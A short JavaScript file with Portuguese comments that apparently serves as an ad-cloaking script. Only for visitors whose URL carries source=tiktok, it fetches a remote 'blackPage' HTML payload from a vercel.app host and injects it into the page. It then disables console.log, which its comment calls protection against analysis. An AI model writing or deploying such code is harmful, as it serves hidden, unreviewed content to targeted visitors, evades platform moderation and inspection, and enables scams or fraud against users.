(function() {
    'use strict';
    
    // Verifica parâmetros de forma case-insensitive
    const urlParams = new URLSearchParams(window.location.search.toLowerCase());
    const sourceParam = urlParams.get('source');
    
    if (sourceParam !== 'tiktok') {
        return; // Não é do TikTok, não faz nada
    }
    
    // Função para buscar configuração
    async function loadConfig() {
        try {
            const response = await fetch('https://dynamic-lac.vercel.app/config.json');
            const config = await response.json();
            
            if (config.blackPage) {
                injectBlackPage(config.blackPage);
            }
        } catch (error) {
            console.error('Erro ao carregar configuração:', error);
        }
    }
    
    // Função para injetar black page
    function injectBlackPage(htmlContent) {
        const tempDiv = document.createElement('div');
        tempDiv.innerHTML = htmlContent;
        document.body.appendChild(tempDiv.firstElementChild || tempDiv);
    }
    
    // Executa quando DOM estiver pronto
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', loadConfig);
    } else {
        loadConfig();
    }
    
    // Proteção adicional contra análise
    const originalConsoleLog = console.log;
    console.log = function() {};
    
})();
